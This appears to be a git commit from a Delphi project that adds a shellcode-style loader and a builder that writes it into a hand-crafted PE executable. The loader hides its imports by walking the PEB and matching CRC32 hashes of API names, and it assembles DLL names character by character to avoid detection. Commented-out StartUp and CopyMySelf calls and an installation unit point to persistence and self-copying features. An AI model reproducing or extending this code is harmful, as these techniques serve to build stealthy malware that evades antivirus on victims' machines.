3d3a1e3851e70fbb54d50eee96ae895de2d6ea22
exAphex <aydin.tekin.66@hotmail.de>
2015-08-10 13:18:20 +0200

    Crafting PE-File added

---
+++ Loader/untLoader.pas
@@ -0,0 +1,152 @@
+unit untLoader;
+
+interface
+uses Windows;
+
+type
+  TAPIRec = packed record
+    hKernel32, hUser32, hShell32, hShFolder : Cardinal;
+    xExitProcess:procedure(uExitCode: UINT); stdcall;
+    xLoadLibraryA:function(lpLibFileName: PChar): Cardinal; stdcall;
+    xMessageBoxW:function(hWnd: HWND; lpText, lpCaption: PWideChar; uType: UINT): Integer; stdcall;
+    xVirtualAlloc:function(lpvAddress: Pointer; dwSize, flAllocationType, flProtect: DWORD): Pointer; stdcall;
+    xGetModuleFileNameW:function(hModule: HINST; lpFilename: PWideChar; nSize: DWORD): DWORD; stdcall;
+    xlstrlenW:function(lpString: PWideChar): Integer; stdcall;
+    xlstrcmpW:function(lpString1, lpString2: PWideChar): Integer; stdcall;
+    xlstrcatW:function(lpString1, lpString2: PWideChar): PWideChar; stdcall;
+    xCopyFileW:function(lpExistingFileName, lpNewFileName: PWideChar; bFailIfExists: BOOL): BOOL; stdcall;
+    xShellExecuteW:function(hWnd: HWND; Operation, FileName, Parameters, Directory: PWideChar; ShowCmd: Integer): HINST; stdcall;
+    xSHGetFolderPathW:function(hwnd: HWND; csidl: Integer; hToken: THandle; dwFlags: DWORD; pszPath: PWideChar): HResult; stdcall;
+    xwsprintfW:function(Output: PWideChar; Format: PWideChar): Integer; cdecl varargs;
+    xAllocMem:function(pAPI:Pointer; dwSize:Cardinal):Pointer;stdcall;
+  end;
+  PAPIRec = ^TAPIRec;
+
+  
+procedure resolver;
+procedure resolver_start();
+procedure resolver_end();
+implementation
+procedure resolver_start();
+begin
+  resolver();
+end;
+
+procedure resolver;
+  function AllocMem(pAPI:PAPIRec; dwSize:Cardinal):Pointer;stdcall;
+  begin
+    Result := pAPI.xVirtualAlloc(nil, dwSize, MEM_COMMIT, PAGE_READWRITE);
+  end;
+
+  procedure LoadLib(pAPI:PAPIRec);stdcall;
+  var
+    strUser32:Array[0..10] of Char;
+    strShell32:Array[0..11] of Char;
+    strShFolder:Array[0..12] of Char;
+  begin
+    strUser32[0]:='u';strUser32[1]:='s';strUser32[2] := 'e';strUser32[3]:='r';strUser32[4]:='3';strUser32[5]:='2';strUser32[6]:='.';strUser32[7]:='d';strUser32[8]:='l';strUser32[9]:='l';strUser32[10]:=#0;
+    strShell32[0]:='s';strShell32[1]:='h';strShell32[2]:='e';strShell32[3]:='l';strShell32[4]:='l';strShell32[5]:='3';strShell32[6]:='2';strShell32[7]:='.';strShell32[8]:='d';strShell32[9]:='l';strShell32[10]:='l';strShell32[11]:=#0;
+    strShFolder[0]:='s';strShFolder[1]:='h';strShFolder[2]:='f';strShFolder[3]:='o';strShFolder[4]:='l';strShFolder[5]:='d';strShFolder[6]:='e';strShFolder[7]:='r';strShFolder[8]:='.';strShFolder[9]:='d';strShFolder[10]:='l';strShFolder[11]:='l';strShFolder[12]:=#0;
+    pAPI.hUser32 := pAPI.xLoadLibraryA(@strUser32[0]);
+    pAPI.hShell32 := pAPI.xLoadLibraryA(@strShell32[0]);
+    pAPI.hShFolder := pAPI.xLoadLibraryA(@strShFolder[0]);
+  end;
+
+  function CalcCrc32(lpSource:PChar; nLength:Integer):Cardinal;stdcall;
+  var
+    Crc32Table: array[0..255] of Cardinal;
+    I,J: Integer;
+    crc: Cardinal;
+  begin
+    for I:=0 to 255 do
+    begin
+      crc := I;
+      for J := 0 to 7 do
+      begin
+        if crc and 1 > 0 then
+          crc := (crc shr 1) xor $EDB88320
+        else
+          crc := crc shr 1;
+      end;
+      Crc32Table[I] := crc;
+    end;
+    Result := $FFFFFFFF;
+    for I := 0 to nLength-1 do
+      Result := (Result shr 8) xor Crc32Table[PByte(Cardinal(lpSource) + i)^ xor (Result and $FF)];
+    Result := not Result;
+  end;
+
+  function GetProcAddressEx(hBase, hHash, dwLen:Cardinal):Pointer;stdcall;
+  var
+    IDH: PImageDosHeader;
+    INH: PImageNtHeaders;
+    IED: PImageExportDirectory;
+    i:  Integer;
+    dwName: DWORD;
+    wOrdinal: WORD;
+  begin
+    IDH := Pointer(hBase);
+    INH := Pointer(hBase + IDH^._lfanew);
+    IED := Pointer(hBase + INH^.OptionalHeader.DataDirectory[0].VirtualAddress);
+    for i := 0 to IED^.NumberOfNames do
+    begin
+      dwName := (hBase + PDWORD(hBase + (DWORD(IED^.AddressOfNames) + (i * 4)))^);
+      if (CalcCrc32(PChar(dwName), dwLen) = hHash) then
+      begin
+        wOrdinal := (PWORD(hBase + DWORD(IED^.AddressOfNameOrdinals) + (i * 2))^);
+        Result := Pointer(hBase + (PDWORD(hBase + DWORD(IED^.AddressOfFunctions) + (wOrdinal * 4))^));
+        break;
+      end;
+    end;
+  end;
+
+  procedure LoadAPIs(pAPI:PAPIRec; hKernel32:Cardinal);
+  begin
+    pAPI.hKernel32 := hKernel32;
+    pAPI.xAllocMem := @AllocMem;
+    pAPI.xLoadLibraryA := GetProcAddressEx(hKernel32, $3FC1BD8D, 12);
+    LoadLib(pAPI);
+    pAPI.xExitProcess := GetProcAddressEx(hKernel32, $251097CC, 11);
+    pAPI.xMessageBoxW := GetProcAddressEx(pAPI.hUser32, $A3F9E8DF, 11);
+    pAPI.xVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
+    pAPI.xGetModuleFileNameW := GetProcAddressEx(hKernel32, $FC6B42F1, 18);
+    pAPI.xlstrlenW := GetProcAddressEx(hKernel32, $1DDA9F5D, 8);
+    pAPI.xlstrcmpW := GetProcAddressEx(hKernel32, $9FEBE16C, 8);
+    pAPI.xlstrcatW := GetProcAddressEx(hKernel32, $F29DDD0C, 8);
+    pAPI.xCopyFileW := GetProcAddressEx(hKernel32, $F54D69C8, 9);
+    pAPI.xShellExecuteW := GetProcAddressEx(pAPI.hShell32, $1FA8A1D9, 13);
+    pAPI.xSHGetFolderPathW := GetProcAddressEx(pAPI.hShell32, $C7652B3F, 16);
+    pAPI.xwsprintfW := GetProcAddressEx(pAPI.hUser32, $201D0DD6, 9);
+  end;
+
+var
+  hModule:Cardinal;
+  hKernel32:Cardinal;
+  pAPI : PAPIRec;
+  pVirtualAlloc:function(lpvAddress: Pointer; dwSize, flAllocationType, flProtect: DWORD): Pointer; stdcall;
+begin
+  asm
+    MOV EAX, FS:[30h]
+    MOV EAX, [EAX+0Ch]
+    MOV EAX, [EAX+0Ch]
+    MOV EAX, [EAX]
+    MOV EAX, [EAX]
+    MOV EAX, [EAX+18h]
+    MOV hKernel32, EAX
+    CALL @GetImageBase
+    @GetImageBase:
+    POP EAX
+    AND EAX, 0FFFF0000h
+    MOV hModule, EAX
+  end;
+  @pVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
+  pAPI := pVirtualAlloc(nil, SizeOf(TAPIRec) , MEM_COMMIT, PAGE_READWRITE);
+  LoadAPIs(pAPI, hKernel32);
+  pAPI.xMessageBoxW(0, nil, nil, 0);
+  //StartUp(pAPI);
+  //CopyMySelf(pAPI);
+  //pAPI.xMessageBoxW(0, GetCurrentDir(pAPI), nil, 0);
+  pAPI.xExitProcess(0);
+end;
+procedure resolver_end(); asm end;
+end.
--- Project1.dpr
+++ Project1.dpr
@@ -2,129 +2,106 @@ program Project1;
 
 uses
   Windows,
-  untStartUp in 'untStartUp.pas',
+  untStartUp in 'Functions\untStartUp.pas',
   untUtils in 'untUtils.pas',
-  untInstallation in 'untInstallation.pas';
+  untInstallation in 'Functions\untInstallation.pas',
+  untLoader in 'Loader\untLoader.pas';
 
-procedure resolver;
-  function AllocMem(pAPI:PAPIRec; dwSize:Cardinal):Pointer;stdcall;
-  begin
-    Result := pAPI.xVirtualAlloc(nil, dwSize, MEM_COMMIT, PAGE_READWRITE);
-  end;
-
-  procedure LoadLib(pAPI:PAPIRec);stdcall;
-  var
-    strUser32:Array[0..10] of Char;
-    strShell32:Array[0..11] of Char;
-    strShFolder:Array[0..12] of Char;
-  begin
-    strUser32[0]:='u';strUser32[1]:='s';strUser32[2] := 'e';strUser32[3]:='r';strUser32[4]:='3';strUser32[5]:='2';strUser32[6]:='.';strUser32[7]:='d';strUser32[8]:='l';strUser32[9]:='l';strUser32[10]:=#0;
-    strShell32[0]:='s';strShell32[1]:='h';strShell32[2]:='e';strShell32[3]:='l';strShell32[4]:='l';strShell32[5]:='3';strShell32[6]:='2';strShell32[7]:='.';strShell32[8]:='d';strShell32[9]:='l';strShell32[10]:='l';strShell32[11]:=#0;
-    strShFolder[0]:='s';strShFolder[1]:='h';strShFolder[2]:='f';strShFolder[3]:='o';strShFolder[4]:='l';strShFolder[5]:='d';strShFolder[6]:='e';strShFolder[7]:='r';strShFolder[8]:='.';strShFolder[9]:='d';strShFolder[10]:='l';strShFolder[11]:='l';strShFolder[12]:=#0;
-    pAPI.hUser32 := pAPI.xLoadLibraryA(@strUser32[0]);
-    pAPI.hShell32 := pAPI.xLoadLibraryA(@strShell32[0]);
-    pAPI.hShFolder := pAPI.xLoadLibraryA(@strShFolder[0]);
-  end;
-
-  function CalcCrc32(lpSource:PChar; nLength:Integer):Cardinal;stdcall;
-  var
-    Crc32Table: array[0..255] of Cardinal;
-    I,J: Integer;
-    crc: Cardinal;
-  begin
-    for I:=0 to 255 do
-    begin
-      crc := I;
-      for J := 0 to 7 do
-      begin
-        if crc and 1 > 0 then
-          crc := (crc shr 1) xor $EDB88320
-        else
-          crc := crc shr 1;
-      end;
-      Crc32Table[I] := crc;
-    end;
-    Result := $FFFFFFFF;
-    for I := 0 to nLength-1 do
-      Result := (Result shr 8) xor Crc32Table[PByte(Cardinal(lpSource) + i)^ xor (Result and $FF)];
-    Result := not Result;
-  end;
-
-  function GetProcAddressEx(hBase, hHash, dwLen:Cardinal):Pointer;stdcall;
-  var
-    IDH: PImageDosHeader;
-    INH: PImageNtHeaders;
-    IED: PImageExportDirectory;
-    i:  Integer;
-    dwName: DWORD;
-    wOrdinal: WORD;
-  begin
-    IDH := Pointer(hBase);
-    INH := Pointer(hBase + IDH^._lfanew);
-    IED := Pointer(hBase + INH^.OptionalHeader.DataDirectory[0].VirtualAddress);
-    for i := 0 to IED^.NumberOfNames do
-    begin
-      dwName := (hBase + PDWORD(hBase + (DWORD(IED^.AddressOfNames) + (i * 4)))^);
-      if (CalcCrc32(PChar(dwName), dwLen) = hHash) then
-      begin
-        wOrdinal := (PWORD(hBase + DWORD(IED^.AddressOfNameOrdinals) + (i * 2))^);
-        Result := Pointer(hBase + (PDWORD(hBase + DWORD(IED^.AddressOfFunctions) + (wOrdinal * 4))^));
-        break;
-      end;
-    end;
-  end;
-
-  procedure LoadAPIs(pAPI:PAPIRec; hKernel32:Cardinal);
-  begin
-    pAPI.hKernel32 := hKernel32;
-    pAPI.xAllocMem := @AllocMem;
-    pAPI.xLoadLibraryA := GetProcAddressEx(hKernel32, $3FC1BD8D, 12);
-    LoadLib(pAPI);
-    pAPI.xExitProcess := GetProcAddressEx(hKernel32, $251097CC, 11);
-    pAPI.xMessageBoxW := GetProcAddressEx(pAPI.hUser32, $A3F9E8DF, 11);
-    pAPI.xVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
-    pAPI.xGetModuleFileNameW := GetProcAddressEx(hKernel32, $FC6B42F1, 18);
-    pAPI.xlstrlenW := GetProcAddressEx(hKernel32, $1DDA9F5D, 8);
-    pAPI.xlstrcmpW := GetProcAddressEx(hKernel32, $9FEBE16C, 8);
-    pAPI.xlstrcatW := GetProcAddressEx(hKernel32, $F29DDD0C, 8);
-    pAPI.xCopyFileW := GetProcAddressEx(hKernel32, $F54D69C8, 9);
-    pAPI.xShellExecuteW := GetProcAddressEx(pAPI.hShell32, $1FA8A1D9, 13);
-    pAPI.xSHGetFolderPathW := GetProcAddressEx(pAPI.hShell32, $C7652B3F, 16);
-    pAPI.xwsprintfW := GetProcAddressEx(pAPI.hUser32, $201D0DD6, 9);
-  end;
-
+procedure CreatePEBase(hFile:DWORD);
 var
-  hModule:Cardinal;
-  hKernel32:Cardinal;
-  pAPI : PAPIRec;
-  pVirtualAlloc:function(lpvAddress: Pointer; dwSize, flAllocationType, flProtect: DWORD): Pointer; stdcall;
+  IDH:  TImageDosHeader;
+  INH:  TImageNtHeaders;
+  ISH:  TImageSectionHeader;
+  dwNull: DWORD;
+  pBuff:  Pointer;
+  dwSpace:  DWORD;
+  dwSize:Cardinal;
+const
+  szText:   string = '.text';
 begin
-  asm
-    MOV EAX, FS:[30h]
-    MOV EAX, [EAX+0Ch]
-    MOV EAX, [EAX+0Ch]
-    MOV EAX, [EAX]
-    MOV EAX, [EAX]
-    MOV EAX, [EAX+18h]
-    MOV hKernel32, EAX
-    CALL @GetImageBase
-    @GetImageBase:
-    POP EAX
-    AND EAX, 0FFFF0000h
-    MOV hModule, EAX
-  end;
-  @pVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
-  pAPI := pVirtualAlloc(nil, SizeOf(TAPIRec) , MEM_COMMIT, PAGE_READWRITE);
-  LoadAPIs(pAPI, hKernel32);
-  
-  //pAPI.xMessageBoxW(0, GetCurrentDir(pAPI), nil, 0);
-  //StartUp(pAPI);
-  //CopyMySelf(pAPI);
-  //pAPI.xMessageBoxW(0, GetCurrentDir(pAPI), nil, 0);
-  pAPI.xExitProcess(0);
+
+  dwSize := DWORD(@resolver_end) - DWORD(@resolver_start);
+
+  FillChar(IDH, 64, $0);
+  IDH.e_magic := IMAGE_DOS_SIGNATURE;
+  IDH._lfanew := $40;
+
+  FillChar(INH, 248, $0);
+  INH.Signature := IMAGE_NT_SIGNATURE;
+  INH.FileHeader.Machine := $014C;
+  INH.FileHeader.NumberOfSections := 1;
+  INH.FileHeader.SizeOfOptionalHeader := $E0;
+  INH.FileHeader.Characteristics := $010F;
+
+  INH.OptionalHeader.Magic := $010B;
+  INH.OptionalHeader.MajorLinkerVersion := 1;
+  INH.OptionalHeader.MinorLinkerVersion := 2;
+  INH.OptionalHeader.SizeOfCode := $200;
+  INH.OptionalHeader.SizeOfInitializedData := $200;
+  INH.OptionalHeader.AddressOfEntryPoint := $1000;
+  INH.OptionalHeader.BaseOfCode := $1000;
+  INH.OptionalHeader.BaseOfData := $1000;
+  INH.OptionalHeader.ImageBase := $00400000;
+  INH.OptionalHeader.SectionAlignment := $1000;
+  INH.OptionalHeader.FileAlignment := $200;
+  INH.OptionalHeader.SizeOfImage := $2000;
+  INH.OptionalHeader.SizeOfHeaders := $200;
+  INH.OptionalHeader.Subsystem := 2;
+  INH.OptionalHeader.SizeOfStackReserve := $100000;
+  INH.OptionalHeader.SizeOfStackCommit := $4000;
+  INH.OptionalHeader.SizeOfHeapReserve := $100000;
+  INH.OptionalHeader.SizeOfHeapCommit := $1000;
+  INH.OptionalHeader.NumberOfRvaAndSizes := $10;
+  INH.OptionalHeader.MajorSubsystemVersion := 4;
+  INH.OptionalHeader.MajorOperatingSystemVersion := 4;
+
+  FillChar(ISH, 40, $0);
+  CopyMemory(@ISH.Name[0], @szText[1], Length(szText));
+  ISH.PointerToRawData := $200;
+  ISH.SizeOfRawData := dwSize;//
+  ISH.VirtualAddress := $1000;
+  ISH.Misc.VirtualSize := $1000;
+  ISH.Characteristics := $60000060;
+
+  SetFilePointer(hFile, 0, nil, FILE_BEGIN);
+  WriteFile(hFile, IDH, 64, dwNull, nil);
+  SetFilePointer(hFile, $40, nil, FILE_BEGIN);
+  WriteFile(hFile, INH, 248, dwNull, nil);
+  SetFilePointer(hFile, $40 + 248, nil, FILE_BEGIN);
+  WriteFile(hFile, ISH, 40, dwNull, nil);
+
+  dwSpace := $200 - (64 + 248 + 40);
+  GetMem(pBuff, dwSpace);
+  SetFilePointer(hFile, 0, nil, FILE_END);
+  WriteFile(hFile, pBuff^, dwSpace, dwNull, nil);
+  FreeMem(pBuff);
 end;
 
+procedure BuildSetup();
+var
+  hFile:  DWORD;
+  dwNull: DWORD;
+  pBuff:  Pointer;
+  dwPos:  DWORD;
+  pFunc:  Pointer;
+  dwSize: DWORD;
+  dwLen:DWORD;
 begin
-   resolver;
-  { TODO -oUser -cConsole Main : Insert code here }
+  dwSize := DWORD(@resolver_end) - DWORD(@resolver_start);
+  hFile := CreateFile('Test.exe', GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);
+  if hFile <> INVALID_HANDLE_VALUE then
+  begin
+    CreatePEBase(hFile);
+    GetMem(pBuff, dwSize);
+    ZeroMemory(pBuff, dwSize);
+    pFunc := @resolver_start;
+    CopyMemory(pBuff, pFunc, dwSize);
+    SetFilePointer(hFile, 0, nil, FILE_END);
+    WriteFile(hFile, pBuff^, dwSize, dwNull, nil);
+    FreeMem(pBuff);
+    CloseHandle(hFile);
+  end;
+end;
+begin
+   BuildSetup;
 end.
